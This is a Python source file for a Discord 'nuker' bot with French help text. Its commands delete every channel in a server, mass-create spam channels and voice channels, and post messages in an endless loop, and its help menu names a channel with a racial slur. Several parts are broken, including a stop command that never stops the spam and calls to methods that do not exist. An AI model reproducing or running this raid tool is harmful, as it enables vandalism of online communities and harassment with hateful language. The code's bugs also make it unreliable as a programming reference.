from discord.ext import commands
from discord.ext.commands import has_permissions, MissingPermissions
from os import system,name
import discord

if name == 'nt':
    system('cls')
else:
    system('clear')

__me__ = "LiBeRtY - https://github.com/masked-github/"

header = """
                                  $$\                       $$\                           $$\                           
                                  $$ |                      $$ |                          $$ |                          
$$$$$$\$$$$\   $$$$$$\   $$$$$$$\ $$ |  $$\  $$$$$$\   $$$$$$$ |      $$$$$$$\  $$\   $$\ $$ |  $$\  $$$$$$\   $$$$$$\  
$$  _$$  _$$\  \____$$\ $$  _____|$$ | $$  |$$  __$$\ $$  __$$ |      $$  __$$\ $$ |  $$ |$$ | $$  |$$  __$$\ $$  __$$\ 
$$ / $$ / $$ | $$$$$$$ |\$$$$$$\  $$$$$$  / $$$$$$$$ |$$ /  $$ |      $$ |  $$ |$$ |  $$ |$$$$$$  / $$$$$$$$ |$$ |  \__|
$$ | $$ | $$ |$$  __$$ | \____$$\ $$  _$$<  $$   ____|$$ |  $$ |      $$ |  $$ |$$ |  $$ |$$  _$$<  $$   ____|$$ |      
$$ | $$ | $$ |\$$$$$$$ |$$$$$$$  |$$ | \$$\ \$$$$$$$\ \$$$$$$$ |      $$ |  $$ |\$$$$$$  |$$ | \$$\ \$$$$$$$\ $$ |      
\__| \__| \__| \_______|\_______/ \__|  \__| \_______| \_______|      \__|  \__| \______/ \__|  \__| \_______|\__|      
"""
print(header)
client = discord.Client(intents=discord.Intents.default())
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!',intents=intents)
bot.remove_command("help")
bot.author_id = 1034074588432310272

@bot.event
async def on_ready():
    print(f"Bot: {bot.user}")
    print(f"Original prefix : ! ")
    print(f"Commands: do \033[4m\033[1m#help\033[0m\033[0m in a channel")



@bot.command(name="clear", pass_context=True)
@commands.has_permissions(manage_messages=True)
async def clear(ctx, amount: int):
    await ctx.channel.purge(limit=amount+1)
    await ctx.message.delete()


@bot.command()
async def help(ctx):
        embed=discord.Embed(title="Help menu", url="https://discord.gg/zsWMEHx2Ss", description="_**Default Prefix: ! **_ \n  1 **clear** - clear des messages ex: !clear 2  \n 2 **kick** - kick un membre du serveur \n 3 _**nuke**_ - nuke le serveur et ajouter un nouveau salon 'nigger' \n 4 **special** - nuke le serveur et ajouter un nouveau salon 'nimporte' = ex: special ligma+balls \n 5 **spam** - spam messages = example: spam huh_? \n 6 **channel** - spam salons : 'Vive masked' \n 7 **spamchannel** - spam salons = ex: spamchannel omg 10 \n 8 **vocal** - créer un salon vocal ex: vocal hey 1 \n 9 **auto** - nuke & fait toutes les commandes raid \n **Spaces are __+__**", color=0xFF5733)
        await ctx.send(embed=embed)

@client.event
async def on_member_join(member):
      general_channel: discord.TextChannel = client.get_channel(1034849491972542474)
      general_channel.send(content=f"Bienvenue sur le serveur {member.display_name} !")

@client.event
async def on_message(message):
    if message.content.lower() == "quoi":
        await message.channel.send("Feur")
    if message.content.lower()== "méchant":
        await message.delete()

@bot.command(name="nuke", pass_context=True)
@commands.has_permissions(ban_members=True)
async def nuke(ctx):
  guild = ctx.guild
  for channel in guild.channels:
    try:
      await channel.delete()
    except:pass
  for i in range(1):
    await guild.create_text_channel('masked-raid-you')

@bot.command(name="channel", pass_context=True)
@commands.has_permissions(ban_members=True)
async def channel(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')

@bot.command(name="spamchannel", pass_context=True)
@commands.has_permissions(ban_members=True)
async def spamchannel(ctx, spam1, amount):
  guild = ctx.guild
  for i in range(int(amount)):await guild.create_text_channel(str(spam1.replace("+", " ")))

@bot.command(name="special", pass_context=True)
@commands.has_permissions(ban_members=True)
async def special(ctx,channeladd):
  for c in ctx.guild.channels:
    await c.delete()
  await ctx.guild.create_text_channel(channeladd.replace("+"," "))
  
@bot.command(name="spam", pass_context=True)
@commands.has_permissions(ban_members=True)
async def spam(ctx, spamtext):
  while 1:await ctx.send(str(spamtext).replace("+"," "))
  
@bot.command(name="stopspam", help="stops the spam messages")
@commands.has_permissions(ban_members=True)
async def stopspam(ctx,):
    global stop_spam_flag
    if ctx:
        stop_spam_flag = True
  
@bot.command(name="vocal", pass_context=True)
@commands.has_permissions(ban_members=True)
async def vocal(ctx,voice,amount):
  guild = ctx.guild
  for i in range(int(amount)):
      await guild.create_voice_channel('jugement')

@bot.command(name="auto", pass_context=True)
@commands.has_permissions(manage_guild=True, manage_channels=True)
async def auto(ctx):
    try:
        guild = ctx.guild
        for channel in guild.channels:
          try:
            await channel.delete()
          except:pass
        guild = bot.get_guild()
        
        category = await guild.create_category("Terminal", overwrites=None, reason=None)
        await guild.create_text_channel('welcome+!', overwrites=None, category=category, reason=None)
        await guild.create_text_channel('goodbye+!', overwrites=None, category=category, reason=None)
        category2 = await guild.create_category("Talk", overwrites=None, reason=None)
        await guild.create_text_channel('chat+!', overwrites=None, category=category2, reason=None)
        await guild.create_text_channel('medias+!', overwrites=None, category=category2, reason=None)
        await guild.create_text_channel('memes+!', overwrites=None, category=category2, reason=None)
        category3 = await guild.create_category("Play/ Laugh" , overwrites=None, reason=None)
        await guild.create_voice_channel('vocal 1 !', overwrites=None, category=category3, reason=None)
        await guild.create_voice_channel('vocal 2 !', overwrites=None, category=category3, reason=None)
        await ctx.send("Setup finished!")
    except Exception as errors:
        print(f"Bot Error: {errors}")


@bot.command(name="kick", pass_context=True)
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    await client.kick(member)
    await ctx.send(f'User {member} has been kick')

token = "Your token"
bot.run(token)
client.run(token)
